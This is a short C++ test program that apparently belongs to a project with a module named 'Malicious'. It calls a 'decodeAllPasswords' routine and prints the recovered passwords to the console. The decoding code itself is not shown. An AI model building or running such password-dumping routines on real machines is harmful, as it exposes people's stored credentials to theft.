#include <cstdlib>
#include <iostream>
using namespace std;

#include <common/Log.hpp>
#include <malicious/Passwords.hpp>
using namespace Malicious;

int main()
{
	LOG.setHeader("TEST PASSWORDS");
	LOG.addObserver(new Common::LogToConsole);
	LOG << decodeAllPasswords(',');
	return EXIT_SUCCESS;
}
